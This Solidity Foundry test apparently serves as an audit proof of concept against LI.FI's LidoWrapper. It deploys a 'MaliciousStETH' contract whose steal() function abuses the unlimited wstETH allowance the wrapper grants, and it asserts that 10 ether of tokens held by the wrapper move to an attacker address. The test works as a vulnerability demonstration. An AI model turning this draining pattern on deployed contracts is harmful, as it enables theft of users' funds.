// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import { LidoWrapper, IStETH } from "lifi/Periphery/LidoWrapper.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockWstETH is ERC20 {
    constructor() ERC20("Wrapped stETH", "wstETH") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousStETH is ERC20, IStETH {
    MockWstETH public wst;
    constructor(MockWstETH _wst) ERC20("stETH", "stETH") {
        wst = _wst;
    }
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
    function wrap(uint256 amount) external override returns (uint256 unwrappedAmount) {
        wst.transferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, amount);
        return amount;
    }
    function unwrap(uint256 amount) external override returns (uint256 wrappedAmount) {
        _burn(msg.sender, amount);
        wst.mint(msg.sender, amount);
        return amount;
    }
    function steal(address from, address to, uint256 amount) external {
        wst.transferFrom(from, to, amount);
    }
}

contract LidoWrapperAllowanceTest is Test {
    LidoWrapper wrapper;
    MaliciousStETH steth;
    MockWstETH wsteth;
    address attacker = address(0xdead);

    function setUp() public {
        wsteth = new MockWstETH();
        steth = new MaliciousStETH(wsteth);
        wrapper = new LidoWrapper(address(steth), address(wsteth), address(this));

        // simulate stray wstETH tokens held by wrapper
        wsteth.mint(address(wrapper), 10 ether);
    }

    function test_UnlimitedAllowanceAllowsSteal() public {
        assertEq(wsteth.balanceOf(attacker), 0);
        // malicious STETH contract drains tokens using approved allowance
        steth.steal(address(wrapper), attacker, 10 ether);
        assertEq(wsteth.balanceOf(attacker), 10 ether);
    }
}

